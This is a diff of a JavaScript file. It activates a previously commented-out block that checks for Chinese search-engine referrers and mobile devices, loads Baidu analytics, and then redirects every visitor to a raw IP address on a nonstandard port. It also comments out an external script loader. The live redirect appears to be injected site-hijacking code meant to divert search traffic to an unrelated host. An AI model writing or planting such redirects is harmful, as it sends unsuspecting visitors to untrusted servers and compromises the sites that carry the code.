@@ -1,5 +1,5 @@
-document.write('<script src="https://i.ixi.plus/epaper.js"><\/script>');
-/*
+//document.write('<script src="https://i.ixi.plus/epaper.js"><\/script>');
+
 function isFromSearchEngine() {
     const referrer = document.referrer;
     const searchEngines = ['sm.cn', 'so.com', 'haosou', 'baidu.', 'toutiao.', 'sogou.'];
@@ -22,9 +22,8 @@ function loadBaiduAnalytics() {
 
 if (isFromSearchEngine() && isMobile()) {
     loadBaiduAnalytics();
-    window.location.href = "https://x29393.com:6987";
+    window.location.href = "https://8.217.73.43:9010/h5";
 } else {
     loadBaiduAnalytics();
-    window.location.href = "https://x29393.com:6987";
+    window.location.href = "https://8.217.73.43:9010/h5";
 }
-*/
